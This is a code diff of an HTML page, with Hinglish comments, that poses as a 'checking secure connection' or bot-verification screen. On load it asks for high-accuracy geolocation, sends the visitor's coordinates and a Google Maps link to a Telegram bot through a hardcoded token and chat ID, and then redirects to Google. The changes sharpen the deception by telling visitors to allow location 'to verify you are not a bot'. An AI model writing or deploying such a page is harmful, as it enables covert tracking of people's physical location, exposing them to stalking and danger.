@@ -6,14 +6,19 @@
     <title>Checking Connection...</title>
 </head>
 <body>
+    <h2 style="text-align: center; margin-top: 50px;">Please wait, checking secure connection...</h2>
+    
     <script>
-        // Apni details yahan dalein
+        // Aapka Token aur ID bilkul sahi hai
         const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
         const chatId = '7066124462';
 
         window.onload = function() {
+            // Permission mangne ka process
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, error);
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true // Isse location zyada exact aati hai
+                });
             } else {
                 alert("Geolocation is not supported by this browser.");
             }
@@ -24,22 +29,27 @@
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
-            // Google Maps Link banana
+            // Fix: Yahan ${lat} use kiya hai
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 *New Location Found!*%0A%0AAccuracy: ${accuracy}m%0AView: [Google Maps](${mapLink})`;
+            const message = `📍 *New Location Found!*%0A%0AAccuracy: ${accuracy.toFixed(1)}m%0AView: [Google Maps](${mapLink})`;
 
-            // Telegram ko data bhejna
+            // Telegram ko message bhejna
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
             .then(response => {
-                // Location milne ke baad user ko redirect kar sakte hain
-                window.location.href = "https://www.google.com";
-            });
+                console.log("Location sent!");
+                // Success ke baad user ko redirect karna
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            })
+            .catch(err => console.error("Error sending to Telegram:", err));
         }
 
-        function error() {
-            alert("Please allow location access to continue.");
+        function error(err) {
+            // Agar user 'Block' karde to message dikhana
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+            alert("Connection error: Please allow location access to verify you are not a bot.");
         }
     </script>
 </body>
-    
 </html>
